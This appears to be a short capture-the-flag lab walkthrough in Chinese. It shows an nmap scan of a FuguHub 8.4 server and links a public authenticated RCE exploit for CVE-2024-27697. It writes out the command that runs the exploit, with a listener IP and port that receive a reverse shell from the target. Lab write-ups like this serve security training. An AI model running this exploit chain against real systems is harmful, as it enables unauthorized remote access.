nmap 結果
```markdown
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http     Barracuda Embedded Web Server
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Date: Tue, 24 Dec 2024 08:28:53 GMT
|_  WebDAV type: Unknown
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
|_http-server-header: BarracudaServer.com (Posix)
9999/tcp open  ssl/http Barracuda Embedded Web Server
| http-methods: 
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-title: Home
|_http-server-header: BarracudaServer.com (Posix)
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Posix)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|   Server Date: Tue, 24 Dec 2024 08:28:53 GMT
|_  WebDAV type: Unknown
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

他的 80 port 禁止訪問 去訪問他的 8082 port
```
http://192.168.191.25:8082/Config-Wizard/wizard/SetAdmin.lsp
```
![image](https://hackmd.io/_uploads/S1ee7WuS1x.png)

在 about 頁面可以發現他的版本號為 8.4 上網找有沒有相關的 exploit 找到[這個](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697)可以 RCE 的
```python
python3 exploit.py -r 192.168.191.25 -rp 8082 -l 192.168.45.187 -p 8888
```

連上後就可以在裡面找到 flag 了
![image](https://hackmd.io/_uploads/rkTY60OHJx.png)
